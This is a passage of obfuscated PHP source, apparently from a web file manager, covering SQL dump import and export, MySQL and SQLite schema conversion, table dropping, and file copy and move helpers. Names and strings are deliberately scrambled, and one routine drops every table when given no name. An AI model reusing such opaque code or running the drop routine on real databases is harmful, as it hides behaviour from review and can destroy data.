json_decode($ô¥à¸ã§[$_SERVER[ĞÂ¤àÓï][374]], !0); if ($Øí’§ÖÇ[$_SERVER[ĞÂ¤àÓï][32]] == $GLOBALS[$_SERVER[ĞÂ¤àÓï][794]] && $Øí’§ÖÇ[$_SERVER[ĞÂ¤àÓï][749]] != 1) { continue; } } } else { if ($ô¥à¸ã§[$_SERVER[ĞÂ¤àÓï][33]] == $_SERVER[ĞÂ¤àÓï][1071] && $ô¥à¸ã§[$_SERVER[ĞÂ¤àÓï][94]] == $_SERVER[ĞÂ¤àÓï][786]) { continue; } } } if ($¼öªöø¢) { $ô¥à¸ã§[$_SERVER[ĞÂ¤àÓï][84]] = "\x7b\151\x6f\x3a{$¼öªöø¢}\x7d" . substr($ô¥à¸ã§[$_SERVER[ĞÂ¤àÓï][84]], strlen("\173\x69\x6f\x3a{$ô¥à¸ã§[$_SERVER[ĞÂ¤àÓï][824]]}\175")); $ô¥à¸ã§[$_SERVER[ĞÂ¤àÓï][824]] = $¼öªöø¢; } $Ê´¼™¶É[] = $_SERVER[ĞÂ¤àÓï][1072] . $this->sqlEncode($ô¥à¸ã§) . $_SERVER[ĞÂ¤àÓï][1073]; } $¸Š¯–¨ = "\111\116\123\105\122\x54\x20\x49\x4e\x54\117\x20\140{$ÃÙÅÔº¡}\140\40\50\x60" . implode($_SERVER[ĞÂ¤àÓï][1074], $‚ ĞµİÜ) . $_SERVER[ĞÂ¤àÓï][1075]; fwrite($Öªƒ£Ğø, $¸Š¯–¨ . implode($_SERVER[ĞÂ¤àÓï][1076], $Ê´¼™¶É) . $_SERVER[ĞÂ¤àÓï][71] . PHP_EOL); $ğË²¨ += $éçÄ­å²; if ($ûÈ¸¼©Ï) { $ûÈ¸¼©Ï->update($éçÄ­å²); } } while ($Š­ÒÆãï == $éçÄ­å²); fclose($Öªƒ£Ğø); return $ğË²¨; } public function sqlToDb($ú§ËÅ…í, &$İûê§ÁÕ) { $ëÙøÀ‘± =& $_SERVER[ĞÂ¤àÓï]; $ˆúƒÌÂé = $this->model()->db(); $Ø—Ùö§Ï = @fopen($ú§ËÅ…í, $ëÙøÀ‘±[1077]); if (!$Ø—Ùö§Ï) { return !1; } $®½êøª— = 0; $¾×‚œÑ = $ëÙøÀ‘±[12]; $ƒ„ğ¶Ó = array(); $‘Œáó× = $this->dbType(); $Ëı—®ï  = $‘Œáó× == $ëÙøÀ‘±[13] ? 500 : 2000; $÷¼Ê‘œÑ = basename($ú§ËÅ…í, $ëÙøÀ‘±[795]); $ŞØÇï³ = 0; $ŒËØ‘´ = 4194304 - 104858; $‰àúÏ«È = 1000000 - 104858; while (!feof($Ø—Ùö§Ï)) { $¦ÉÀ»’¨ = trim(fgets($Ø—Ùö§Ï)); if (!$¦ÉÀ»’¨) { continue; } $šÊÉå“ = $this->sqlDecode($¦ÉÀ»’¨, $‘Œáó×, $÷¼Ê‘œÑ); if (stripos($šÊÉå“, $ëÙøÀ‘±[355]) === 0) { if (!$¾×‚œÑ) { $¾×‚œÑ = $šÊÉå“ . $ëÙøÀ‘±[53]; } continue; } if ($İûê§ÁÕ) { $İûê§ÁÕ->task[$ëÙøÀ‘±[793]] += 1; } $®½êøª—++; $ƒ„ğ¶Ó[] = rtrim(rtrim(trim($šÊÉå“), $ëÙøÀ‘±[50]), $ëÙøÀ‘±[71]); $Æ¼±˜ÁÑ = null; $ÇêòÌ¡æ = strlen($šÊÉå“); $ŞØÇï³ += $ÇêòÌ¡æ; if ($ŞØÇï³ >= ($Ëı—®ï  == 500 ? $‰àúÏ«È : $ŒËØ‘´)) { $Æ¼±˜ÁÑ = array_pop($ƒ„ğ¶Ó); if ($®½êøª— > 1) { $®½êøª—--; } } if ($®½êøª— >= $Ëı—®ï  || $Æ¼±˜ÁÑ) { $šÊÉå“ = $¾×‚œÑ . implode($ëÙøÀ‘±[50], $ƒ„ğ¶Ó); if (!$ˆúƒÌÂé->execute($šÊÉå“)) { return !1; } if ($İûê§ÁÕ) { $İûê§ÁÕ->update($®½êøª—); } $ƒ„ğ¶Ó = array(); $®½êøª— = 0; $ŞØÇï³ = 0; if ($Æ¼±˜ÁÑ) { $ƒ„ğ¶Ó = array($Æ¼±˜ÁÑ); $®½êøª— = 1; $ŞØÇï³ = $ÇêòÌ¡æ; } } } fclose($Ø—Ùö§Ï); if (!empty($ƒ„ğ¶Ó)) { $šÊÉå“ = $¾×‚œÑ . implode($ëÙøÀ‘±[50], $ƒ„ğ¶Ó); if (!$ˆúƒÌÂé->execute($šÊÉå“)) { return !1; } if ($İûê§ÁÕ) { $İûê§ÁÕ->update($®½êøª—); } } return !0; } public function dropTable($ì‡ˆ“á¡ = null) { $¤§½ğ–Ğ = $this->model()->db(); $–ÇŒ·û¨ = $ì‡ˆ“á¡ ? array($ì‡ˆ“á¡) : $¤§½ğ–Ğ->getTables(); if (!$–ÇŒ·û¨) { return; } foreach ($–ÇŒ·û¨ as $ì‡ˆ“á¡) { if ($ì‡ˆ“á¡) { $ì‡ˆ“á¡ = strtolower($ì‡ˆ“á¡); } else { continue; } $¤§½ğ–Ğ->execute("\144\162\157\160\x20\x74\141\142\154\x65\40\x69\x66\40\x65\x78\x69\x73\164\163\40\140{$ì‡ˆ“á¡}\x60"); } } private function sqlEncode($ØÙ€‹†) { $Æ¢¢î§ =& $_SERVER[ĞÂ¤àÓï]; $‘½Şˆ©› = array(); foreach ($ØÙ€‹† as $‰±ƒÆø£) { if (is_array($‰±ƒÆø£)) { $‰±ƒÆø£ = json_encode_force($‰±ƒÆø£); } $‰±ƒÆø£ = addslashes($‰±ƒÆø£); $‰±ƒÆø£ = str_replace(array($Æ¢¢î§[1078], $Æ¢¢î§[231]), array($Æ¢¢î§[1079], $Æ¢¢î§[1080]), $‰±ƒÆø£); $‘½Şˆ©›[] = str_replace($Æ¢¢î§[58], $Æ¢¢î§[1081], $‰±ƒÆø£); } return $Æ¢¢î§[58] . implode($Æ¢¢î§[1082], $‘½Şˆ©›) . $Æ¢¢î§[58]; } private function sqlDecode($ñ®÷Üùµ, $øÜÖ¦á†, $˜›åæ™® = '') { $Ê¨¢Ëˆü =& $_SERVER[ĞÂ¤àÓï]; $ñ®÷Üùµ = str_replace(array($Ê¨¢Ëˆü[1079], $Ê¨¢Ëˆü[1080]), array($Ê¨¢Ëˆü[1078], $Ê¨¢Ëˆü[231]), $ñ®÷Üùµ); if ($øÜÖ¦á† == $Ê¨¢Ëˆü[13]) { return $˜›åæ™® != $Ê¨¢Ëˆü[1083] ? stripslashes($ñ®÷Üùµ) : $ñ®÷Üùµ; } if ($˜›åæ™® == $Ê¨¢Ëˆü[1083]) { $ñ®÷Üùµ = str_replace($Ê¨¢Ëˆü[1084], $Ê¨¢Ëˆü[118], stripslashes($ñ®÷Üùµ)); } return $ñ®÷Üùµ; } public function getSqlFile($‘ïİ¤¯Ö = '') { $ê€»ÜÕ =& $_SERVER[ĞÂ¤àÓï]; $ë‘·‰Ù = $this->dbType(!0); $­”ÛâÓ« = CONTROLLER_DIR . "\151\x6e\163\x74\x61\154\x6c\57\x64\141\x74\x61\x2f{$ë‘·‰Ù}\x2e\163\x71\154"; $³“•œ®Å = file_get_contents($­”ÛâÓ«); $ˆ×ƒ‚â· = $ê€»ÜÕ[1085] . ($ë‘·‰Ù == $ê€»ÜÕ[811] ? $ê€»ÜÕ[1086] : $ê€»ÜÕ[1087]) . $ê€»ÜÕ[1088]; preg_match_all($ˆ×ƒ‚â·, $³“•œ®Å, $‰Úì¨‚›); $”ÎòàÑ• = $‰Úì¨‚›[1]; $çìù»œ = $this->model()->db(); $ëÑØË«İ = $çìù»œ->getTables(); $ŞóœŸ§ = TEMP_FILES . $ê€»ÜÕ[1089] . date($ê€»ÜÕ[750]) . $ê€»ÜÕ[8]; del_dir($ŞóœŸ§); mk_dir($ŞóœŸ§); $ûœçÏæ = $ŞóœŸ§ . $ê€»ÜÕ[1090]; $‰Š™¤Ğ• = $ŞóœŸ§ . $ê€»ÜÕ[1091]; $óÛÂÏ¬è = $ë‘·‰Ù == $ê€»ÜÕ[13] ? $ê€»ÜÕ[811] : $ê€»ÜÕ[13]; IO::copy(CONTROLLER_DIR . "\x69\156\163\164\x61\154\x6c\x2f\x64\x61\x74\x61\x2f{$óÛÂÏ¬è}\x2e\163\161\x6c", $ŞóœŸ§); @touch($ŞóœŸ§ . $ë‘·‰Ù . $ê€»ÜÕ[795]); $ı¥‚“†Ï = fopen($ûœçÏæ, $ê€»ÜÕ[1066]); $şÕÁ†û = fopen($‰Š™¤Ğ•, $ê€»ÜÕ[1066]); if ($ë‘·‰Ù == $ê€»ÜÕ[13]) { $ëÑØË«İ = array_diff($ëÑØË«İ, array($ê€»ÜÕ[791], $ê€»ÜÕ[792])); $ëş»ìˆº = array($ê€»ÜÕ[1092], $ê€»ÜÕ[1093], $ê€»ÜÕ[1094]); fwrite($şÕÁ†û, implode(PHP_EOL, $ëş»ìˆº) . PHP_EOL . PHP_EOL); foreach ($ëÑØË«İ as $‘×Ìàê¹) { $”Ì‘â˜ = $this->sqlFromSqlite($‘×Ìàê¹); if (!$”Ì‘â˜[$ê€»ÜÕ[13]]) { continue; } fwrite($şÕÁ†û, $”Ì‘â˜[$ê€»ÜÕ[13]] . PHP_EOL . PHP_EOL); if (!in_array($‘×Ìàê¹, $”ÎòàÑ•)) { fwrite($ı¥‚“†Ï, $”Ì‘â˜[$ê€»ÜÕ[811]] . PHP_EOL . PHP_EOL); } } } else { foreach ($ëÑØË«İ as $‘×Ìàê¹) { $”Ì‘â˜ = $this->sqlFromMysql($‘×Ìàê¹); if (!$”Ì‘â˜[$ê€»ÜÕ[811]]) { continue; } fwrite($ı¥‚“†Ï, $”Ì‘â˜[$ê€»ÜÕ[811]] . PHP_EOL . PHP_EOL); if (!in_array($‘×Ìàê¹, $”ÎòàÑ•)) { fwrite($şÕÁ†û, $”Ì‘â˜[$ê€»ÜÕ[13]] . PHP_EOL . PHP_EOL); } } } fclose($ı¥‚“†Ï); fclose($şÕÁ†û); $³“•œ®Å = array($ê€»ÜÕ[811] => $ûœçÏæ, $ê€»ÜÕ[13] => $‰Š™¤Ğ•); return $‘ïİ¤¯Ö ? $³“•œ®Å[$‘ïİ¤¯Ö] : $³“•œ®Å; } public function dbType($Á¶Œ¸£à = false) { $ÖÅ•¾å =& $_SERVER[ĞÂ¤àÓï]; $ÊöÛŠ = $Á¶Œ¸£à ? $GLOBALS[$ÖÅ•¾å[6]][$ÖÅ•¾å[21]] : $this->database; $ÊöÛŠ = array_change_key_case($ÊöÛŠ); $ì“Õ‘å¥ = $ÊöÛŠ[$ÖÅ•¾å[967]]; if ($ì“Õ‘å¥ == $ÖÅ•¾å[964]) { $ú‘ôŒÎõ = explode($ÖÅ•¾å[4], $ÊöÛŠ[$ÖÅ•¾å[973]]); $ì“Õ‘å¥ = $ú‘ôŒÎõ[0]; } $ÑôŞû‡ = array($ÖÅ•¾å[1095] => $ÖÅ•¾å[13], $ÖÅ•¾å[912] => $ÖÅ•¾å[811]); if (isset($ÑôŞû‡[$ì“Õ‘å¥])) { $ì“Õ‘å¥ = $ÑôŞû‡[$ì“Õ‘å¥]; } return $ì“Õ‘å¥; } public function sqlFromMysql($¶˜©ºò, $Å³çëãÇ = '') { $åëñÎÈ =& $_SERVER[ĞÂ¤àÓï]; $Ïèşˆû = $this->model()->db(); $¦Ğ÷Ëƒ = $Ïèşˆû->query($åëñÎÈ[1096] . $¶˜©ºò . $åëñÎÈ[385]); if (!$¦Ğ÷Ëƒ || !$¦Ğ÷Ëƒ[0]) { return !1; } $î¿ìœ¡Ê = _get($¦Ğ÷Ëƒ[0], $åëñÎÈ[1097], $åëñÎÈ[12]); if (!$î¿ìœ¡Ê) { return !1; } $ùâ•¿á¿ = "\x44\122\x4f\x50\40\x54\x41\102\x4c\x45\x20\111\x46\40\105\x58\111\x53\x54\123\x20\x60{$¶˜©ºò}\140\73" . PHP_EOL . $î¿ìœ¡Ê . $åëñÎÈ[71]; if ($Å³çëãÇ && $Å³çëãÇ == $åëñÎÈ[811]) { return $ùâ•¿á¿; } $Ç¤ÂÜà„ = array_change_key_case($GLOBALS[$åëñÎÈ[6]][$åëñÎÈ[21]]); $“»•ˆà„ = $Ç¤ÂÜà„[$åëñÎÈ[972]]; $òòû÷µğ = $åëñÎÈ[1098] . $“»•ˆà„ . $åëñÎÈ[1099] . $¶˜©ºò . $åëñÎÈ[58]; $ÀÅ©‚ãÕ = $åëñÎÈ[1100] . $¶˜©ºò . $åëñÎÈ[900]; $©“Ú¯Ò = $Ïèşˆû->query($òòû÷µğ); if (empty($©“Ú¯Ò)) { $²‹Îºİ = array($åëñÎÈ[811] => $åëñÎÈ[12], $åëñÎÈ[13] => $åëñÎÈ[12]); return $Å³çëãÇ ? $²‹Îºİ[$Å³çëãÇ] : $²‹Îºİ; } $õ¾Ô« = $Ïèşˆû->query($ÀÅ©‚ãÕ); $Ïáöí¹— = $åëñÎÈ[12]; $û§õç¶ = array(); foreach ($õ¾Ô« as $Ş‡¯— ×) { if (!$Ïáöí¹— && $Ş‡¯— ×[$åëñÎÈ[1101]] == $åëñÎÈ[1102]) { $Ïáöí¹— = $Ş‡¯— ×[$åëñÎÈ[1103]]; } if (isset($û§õç¶[$Ş‡¯— ×[$åëñÎÈ[1101]]])) { $û§õç¶[$Ş‡¯— ×[$åëñÎÈ[1101]]][$åëñÎÈ[1104]][] = $Ş‡¯— ×[$åëñÎÈ[1103]]; continue; } $û§õç¶[$Ş‡¯— ×[$åëñÎÈ[1101]]] = array($åëñÎÈ[1105] => $Ş‡¯— ×[$åëñÎÈ[1101]], $åëñÎÈ[1104] => array($Ş‡¯— ×[$åëñÎÈ[1103]]), $åëñÎÈ[1106] => $Ş‡¯— ×[$åëñÎÈ[1107]] == $åëñÎÈ[88] ? 0 : 1); } $ÓÍÑÈĞ¶ = array(); foreach ($û§õç¶ as $Ş‡¯— ×) { $î—÷ìèÀ = $Ş‡¯— ×[$åëñÎÈ[1105]] == $åëñÎÈ[1102]; $Ê¦æñı¶ = array($åëñÎÈ[1108], $Ş‡¯— ×[$åëñÎÈ[1106]] == $åëñÎÈ[88] && !$î—÷ìèÀ ? $åëñÎÈ[1109] : $åëñÎÈ[12], $åëñÎÈ[1110], $åëñÎÈ[1111] . $¶˜©ºò . $åëñÎÈ[11] . ($î—÷ìèÀ ? $åëñÎÈ[1112] : $Ş‡¯— ×[$åëñÎÈ[1105]]) . $åëñÎÈ[118], $åëñÎÈ[1113], $åëñÎÈ[118] . $¶˜©ºò . $åëñÎÈ[118], $åëñÎÈ[1114] . implode($åëñÎÈ[1115], $Ş‡¯— ×[$åëñÎÈ[1104]]) . $åëñÎÈ[1116]); $ÓÍÑÈĞ¶[] = implode($åëñÎÈ[53], $Ê¦æñı¶) . $åëñÎÈ[71]; } $Ùş¨Ïñ¸ = array(); $­ÕÚ„Èê = array($åëñÎÈ[1117] => $åëñÎÈ[1118], $åëñÎÈ[1118] => $åëñÎÈ[1118], $åëñÎÈ[288] => $åëñÎÈ[315], $åëñÎÈ[287] => $åëñÎÈ[315]); foreach ($©“Ú¯Ò as $Ş‡¯— ×) { $Ê¦æñı¶ = array($åëñÎÈ[118] . $Ş‡¯— ×[$åëñÎÈ[1119]] . $åëñÎÈ[118], isset($­ÕÚ„Èê[$Ş‡¯— ×[$åëñÎÈ[1120]]]) ? $­ÕÚ„Èê[$Ş‡¯— ×[$åëñÎÈ[1120]]] : $Ş‡¯— ×[$åëñÎÈ[1121]], $Ş‡¯— ×[$åëñÎÈ[1122]] == $åëñÎÈ[898] ? $åëñÎÈ[1123] : $åëñÎÈ[1124], $Ş‡¯— ×[$åëñÎÈ[1119]] == $Ïáöí¹— ? $åëñÎÈ[1125] : $åëñÎÈ[12], $Ş‡¯— ×[$åëñÎÈ[949]] ? strtoupper(str_replace($åëñÎÈ[11], $åëñÎÈ[12], $Ş‡¯— ×[$åëñÎÈ[949]])) : $åëñÎÈ[12]); $Ùş¨Ïñ¸[] = trim(implode($åëñÎÈ[53], $Ê¦æñı¶)); } $ñ˜üÙÊÚ = array($åëñÎÈ[1126] . $¶˜©ºò . $åëñÎÈ[1127], $åëñÎÈ[1128] . $¶˜©ºò . $åëñÎÈ[1129], implode($åëñÎÈ[50] . PHP_EOL, $Ùş¨Ïñ¸), $åëñÎÈ[946]); $„×ÎÑæ = implode(PHP_EOL, array_merge($ñ˜üÙÊÚ, $ÓÍÑÈĞ¶)); if ($Å³çëãÇ && $Å³çëãÇ == $åëñÎÈ[13]) { return $„×ÎÑæ; } $²‹Îºİ = array($åëñÎÈ[811] => $ùâ•¿á¿, $åëñÎÈ[13] => $„×ÎÑæ); return $Å³çëãÇ ? $²‹Îºİ[$Å³çëãÇ] : $²‹Îºİ; } public function sqlFromSqlite($•ˆ ôÕ¨, $óÏ•ü» = '') { $¬Æ¯ß =& $_SERVER[ĞÂ¤àÓï]; $„¢ğÌÛ÷ = $this->model()->db(); $ÃÍÇ“õ´ = "\120\122\x41\x47\x4d\101\40\124\101\102\x4c\x45\x5f\x49\x4e\x46\117\x20\50\x27{$•ˆ ôÕ¨}\x27\51"; $Ã®×ùÄµ = "\123\x45\x4c\x45\x43\124\40\52\40\x46\x52\x4f\115\40\163\161\x6c\x69\164\x65\137\155\141\163\x74\145\162\x20\x57\110\105\x52\105\x20\164\x62\154\137\x6e\141\155\x65\40\75\40\47{$•ˆ ôÕ¨}\47"; $À¢ç®åÓ = $„¢ğÌÛ÷->query($ÃÍÇ“õ´); if (empty($À¢ç®åÓ)) { $ÁÑıÑ¡å = array($¬Æ¯ß[811] => $¬Æ¯ß[12], $¬Æ¯ß[13] => $¬Æ¯ß[12]); return $óÏ•ü» ? $ÁÑıÑ¡å[$óÏ•ü»] : $ÁÑıÑ¡å; } $’”ıöáö = $„¢ğÌÛ÷->query($Ã®×ùÄµ); $ë¼®âÓ¬ = $íÈƒ‘¡´ = array(); foreach ($’”ıöáö as $ÔÒè»çı) { if ($ÔÒè»çı[$¬Æ¯ß[33]] == $¬Æ¯ß[279]) { $ë¼®âÓ¬[] = $ÔÒè»çı[$¬Æ¯ß[1130]]; } else { $íÈƒ‘¡´[$ÔÒè»çı[$¬Æ¯ß[32]]] = $ÔÒè»çı[$¬Æ¯ß[1130]]; } } $¾‰¤™³À = array_merge(array($¬Æ¯ß[1126] . $•ˆ ôÕ¨ . $¬Æ¯ß[118]), $ë¼®âÓ¬, array_values($íÈƒ‘¡´)); $¾‰¤™³À = implode($¬Æ¯ß[71] . PHP_EOL, $¾‰¤™³À) . $¬Æ¯ß[71]; if ($óÏ•ü» && $óÏ•ü» == $¬Æ¯ß[13]) { return $¾‰¤™³À; } $Ÿ‰ÁÏÍï = array(); $íæ¸÷Á = array($¬Æ¯ß[1118] => $¬Æ¯ß[1131], $¬Æ¯ß[315] => $¬Æ¯ß[1132]); $Î‚î–›— = $¬Æ¯ß[12]; foreach ($À¢ç®åÓ as $ÔÒè»çı) { if ($ÔÒè»çı[$¬Æ¯ß[57]] == $¬Æ¯ß[88]) { $Î‚î–›— = $ÔÒè»çı[$¬Æ¯ß[32]]; } $¸åÆ™°¯ = array($¬Æ¯ß[385] . $ÔÒè»çı[$¬Æ¯ß[32]] . $¬Æ¯ß[385], isset($íæ¸÷Á[$ÔÒè»çı[$¬Æ¯ß[33]]]) ? $íæ¸÷Á[$ÔÒè»çı[$¬Æ¯ß[33]]] : $ÔÒè»çı[$¬Æ¯ß[33]], $ÔÒè»çı[$¬Æ¯ß[35]] == $¬Æ¯ß[88] ? $¬Æ¯ß[1123] : $¬Æ¯ß[1133] . $ÔÒè»çı[$¬Æ¯ß[56]], $ÔÒè»çı[$¬Æ¯ß[57]] == $¬Æ¯ß[88] ? $¬Æ¯ß[1134] : $¬Æ¯ß[12]); $Ÿ‰ÁÏÍï[] = trim(implode($¬Æ¯ß[53], $¸åÆ™°¯)); } foreach ($íÈƒ‘¡´ as $ñÌñ¾ÏÏ => $¢©¯È±‹) { $’€óã™Ğ = str_replace($¬Æ¯ß[1135] . $•ˆ ôÕ¨ . $¬Æ¯ß[11], $¬Æ¯ß[12], $ñÌñ¾ÏÏ); $¢Á–Øª = str_replace(array($¬Æ¯ß[118], $¬Æ¯ß[957]), $¬Æ¯ß[385], substr($¢©¯È±‹, stripos($¢©¯È±‹, $¬Æ¯ß[260]))); if ($’€óã™Ğ == $¬Æ¯ß[1112]) { $…ßüÒÀ = $¬Æ¯ß[1136] . $Î‚î–›— . $¬Æ¯ß[1137]; } else { $…ßüÒÀ = (stripos($’€óã™Ğ, $¬Æ¯ß[11]) ? $¬Æ¯ß[1138] : $¬Æ¯ß[12]) . ($¬Æ¯ß[1139] . $’€óã™Ğ . $¬Æ¯ß[1140] . $¢Á–Øª); } $Ÿ‰ÁÏÍï[] = $…ßüÒÀ; } $›Ì™Ä›‹ = array($¬Æ¯ß[1141] . $•ˆ ôÕ¨ . $¬Æ¯ß[1142], $¬Æ¯ß[1143] . $•ˆ ôÕ¨ . $¬Æ¯ß[1144], implode($¬Æ¯ß[50] . PHP_EOL, $Ÿ‰ÁÏÍï), $¬Æ¯ß[1145]); $ÅÈÊ…€í = implode(PHP_EOL, $›Ì™Ä›‹); if ($óÏ•ü» && $óÏ•ü» == $¬Æ¯ß[811]) { return $ÅÈÊ…€í; } $ÁÑıÑ¡å = array($¬Æ¯ß[811] => $ÅÈÊ…€í, $¬Æ¯ß[13] => $¾‰¤™³À); return $óÏ•ü» ? $ÁÑıÑ¡å[$óÏ•ü»] : $ÁÑıÑ¡å; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($©°À¶¡½, $½‘¯£½¼) { $³ä¥º× =& $_SERVER[ĞÂ¤àÓï]; $ò—›±²ù = $½‘¯£½¼; $GLOBALS[$³ä¥º×[1146]] = $³ä¥º×[1147] . $©°À¶¡½; Hook::trigger($³ä¥º×[1147] . $©°À¶¡½ . $³ä¥º×[1148], $ò—›±²ù); $ƒËì© = self::driverMake($½‘¯£½¼[0]); if (!$ƒËì©) { return !1; } if (method_exists($ƒËì©, $©°À¶¡½)) { $«ëŞ‚¶Î = @call_user_func_array(array($ƒËì©, $©°À¶¡½), $½‘¯£½¼); } else { if (method_exists($ƒËì©, $³ä¥º×[1149])) { $«ëŞ‚¶Î = @call_user_func_array(array($ƒËì©, $©°À¶¡½), $½‘¯£½¼); } else { if (method_exists(self, $©°À¶¡½)) { $«ëŞ‚¶Î = @call_user_func_array(array(self, $©°À¶¡½), $½‘¯£½¼); } else { $«ëŞ‚¶Î = call_user_func_array(array(parent, $©°À¶¡½), $½‘¯£½¼); } } } Hook::trigger($³ä¥º×[1147] . $©°À¶¡½ . $³ä¥º×[1150], $ò—›±²ù, $«ëŞ‚¶Î); return $«ëŞ‚¶Î; } public static function init($™£ú˜²ë) { return self::driverMake($™£ú˜²ë); } public static function copy($ú•ÔˆâÃ, $¬š•İÅ, $ü‚Â‡ï¾ = false, $ä¦Õòó = false) { return self::copyMoveStart($ú•ÔˆâÃ, $¬š•İÅ, $ü‚Â‡ï¾, $_SERVER[ĞÂ¤àÓï][555], $ä¦Õòó); } public static function move($€ØèõÊ, $¯´û¯Ù‚, $¿²àíŠÌ = false, $ÀÁ² = false) { return self::copyMoveStart($€ØèõÊ, $¯´û¯Ù‚, $¿²àíŠÌ, $_SERVER[ĞÂ¤àÓï][557], $ÀÁ²); } private static function copyMoveStart($ñıºÖú , $¬ğë¶ŒÕ, $í®ÙÓĞÆ, $áÍó±ï—, $”ÈÂßºç) { $ÏË˜’è° =& $_SERVER[ĞÂ¤àÓï]; $ô°º¬ü‰ = array($ñıºÖú , $¬ğë¶ŒÕ, $í®ÙÓĞÆ, $”ÈÂßºç); Hook::trigger($ÏË˜’è°[1147] . $áÍó±ï— . $ÏË˜’è°[1148], $ô°º¬ü‰); $³ûñÏ– = self::copyMove($ñıºÖú , $¬ğë¶ŒÕ, $í®ÙÓĞÆ, $áÍó±ï—, $”ÈÂßºç); Hook::trigger($ÏË˜’è°[1147] . $áÍó±ï— . $ÏË˜’è°[1150], $ô°º¬ü‰, $³ûñÏ–); return $³ûñÏ–; } public static function saveFile($Ú¦Ë©êÕ, $Û‚½¶³, $ÃıúƒÃ = true) { $×è¸ÀŠ =& $_SERVER[ĞÂ¤àÓï]; $ù²Û¡µ = self::info($Û‚½¶³); $È¡÷ÙòÎ = self::driverMake($Ú¦Ë©êÕ); $ãÓƒÙÇ = self::driverMake($Û‚½¶³); $‡¨¢†Œ— = !1; if ($ãÓƒÙÇ->pathParse[$×è¸ÀŠ[1151]]) { $‡¨¢†Œ— = $ãÓƒÙÇ; $ôæóÂ±ò = $ãÓƒÙÇ->pathParse[$×è¸ÀŠ[1151]]; $ãÓƒÙÇ = self::driverMake($ôæóÂ±ò); } if ($È¡÷ÙòÎ->pathParse[$×è¸ÀŠ[1151]]) { $«Ø‡ãÜŠ = $È¡÷ÙòÎ->pathParse[$×è¸ÀŠ[1151]]; $È¡÷ÙòÎ = self::driverMake($«Ø‡ãÜŠ); } $™Å‰Ö‹“ = $ãÓƒÙÇ->pathFather($Û‚½¶³); $»ß§™¸Ø = !0; if (!$ÃıúƒÃ && self::driverIsSame($È¡÷ÙòÎ, $ãÓƒÙÇ)) { $»ß§™¸Ø = !1; } $«²¨è¸ = self::copyFile($È¡÷ÙòÎ, $Ú¦Ë©êÕ, $ãÓƒÙÇ, $™Å‰Ö‹“, $ù²Û¡µ[$×è¸ÀŠ[32]], $»ß§™¸Ø); if ($‡¨¢†Œ—) { $«²¨è¸ = $‡¨¢†Œ—->getPathOuter($«²¨è¸); } return $«²¨è¸; } private static function copyMove($Ö©äÔ², $¬‰æ©èø, $úÉÌˆ‡, $ºóë¤Óß, $æ•´†½ = false) { $±²†×§Ú =& $_SERVER[ĞÂ¤àÓï]; if (!$Ö©äÔ² || $Ö©äÔ² == $±²†×§Ú[8] || !$¬‰æ©èø) { return !1; } ignore_timeout(); $×êªğõ„ = self::driverMake($Ö©äÔ²); $ÄŒÖ“½ô = self::driverMake($¬‰æ©èø); $Ñ—³ù‡È = $ºóë¤Óß == $±²†×§Ú[557]; $Šİ¸Ü² = !1; if ($ÄŒÖ“½ô->pathParse[$±²†×§Ú[1151]]) { $Šİ¸Ü² = $ÄŒÖ“½ô; $¬‰æ©èø = $ÄŒÖ“½ô->pathParse[$±²†×§Ú[1151]]; $ÄŒÖ“½ô = self::driverMake($¬‰æ©èø); } if ($×êªğõ„->pathParse[$±²†×§Ú[1151]]) { $Ö©äÔ² = $×êªğõ„->pathParse[$±²†×§Ú[1151]]; $×êªğõ„ = self::driverMake($Ö©äÔ²); } self::check($×êªğõ„, $Ö©äÔ², $ÄŒÖ“½ô, $¬‰æ©èø); Hook::trigger($±²†×§Ú[1152], $×êªğõ„, $Ö©äÔ², $ÄŒÖ“½ô, $¬‰æ©èø); $Â²Õ¨…† = self::driverIsSame($×êªğõ„, $ÄŒÖ“½ô); if ($Â²Õ¨…†) { if ($ºóë¤Óß == $±²†×§Ú[557] && !method_exists($ÄŒÖ“½ô, $±²†×§Ú[1153]) && trim($¬‰æ©èø, $±²†×§Ú[8]) == trim($ÄŒÖ“½ô->pathFather($Ö©äÔ²), $±²†×§Ú[8])) { if ($×êªğõ„->pathThis($Ö©äÔ²) != $æ•´†½ && !$×êªğõ„->isTypeObject()) { return $×êªğõ„->rename($Ö©äÔ², $æ•´†½); } return $ÄŒÖ“½ô->getPathOuter($Ö©äÔ²); } if (method_exists($ÄŒÖ“½ô, $ºóë¤Óß)) { return $ÄŒÖ“½ô->{$ºóë¤Óß}($Ö©äÔ², $¬‰æ©èø, $úÉÌˆ‡, $æ•´†½); } } if ($Â²Õ¨…† && $ºóë¤Óß == $±²†×§Ú[557] && $ÄŒÖ“½ô->getType() == $±²†×§Ú[106]) { $¼÷Õ¾âø = $ÄŒÖ“½ô->movePath($Ö©äÔ², $¬‰æ©èø, $æ•´†½); if ($¼÷Õ¾âø) { return $¼÷Õ¾âø; } } $ºíğáš = $×êªğõ„->isFile($Ö©äÔ²); if (!$ºíğáš && $ÄŒÖ“½ô->getType() == $±²†×§Ú[757] && $×êªğõ„->getType() == $±²†×§Ú[106]) { $¼÷Õ¾âø = $ÄŒÖ“½ô->copyFolderFromIO($×êªğõ„, $Ö©äÔ², $¬‰æ©èø, $úÉÌˆ‡, $Ñ—³ù‡È, $æ•´†½); } else { $¼÷Õ¾âø = self::copyPath($×êªğõ„, $Ö©äÔ², $ÄŒÖ“½ô, $¬‰æ©èø, $úÉÌˆ‡, $Ñ—³ù‡È, $ºíğáš, $æ•´†½); } if ($¼÷Õ¾âø && $Ñ—³ù‡È) { $×êªğõ„->remove($Ö©äÔ²); } if ($Šİ¸Ü²) { $¼÷Õ¾âø = $Šİ¸Ü²->getPathOuter($¼÷Õ¾âø); } return $¼÷Õ¾âø; } private static function check($¼ª˜²ÙÅ, $üóµƒõ, $”Ï˜¨ı», &$ëúİÔµ—) { $Å­‹ü‚â =& $_SERVER[ĞÂ¤àÓï]; if (self::driverIsSame($¼ª˜²ÙÅ, $”Ï˜¨ı») && $¼ª˜²ÙÅ->isFolder($üóµƒõ) && $¼ª˜²ÙÅ->isParentOf($üóµƒõ, $ëúİÔµ—)) { show_json(LNG($Å­‹ü‚â[1154]), !1); } if (!$¼ª˜²ÙÅ->exist($üóµƒõ)) { show_json(LNG($Å­‹ü‚â[105]), !1); } } private static function copyPath($ˆÓ­£’š, $ğ¦Úñƒô, $õ†Ë©Şº, $ƒ„éê€ò, $ÚÀ³ŒğÙ, $Ó¤°‘¹, $úŸœÒƒ˜, $²´®õÊÂ = false, 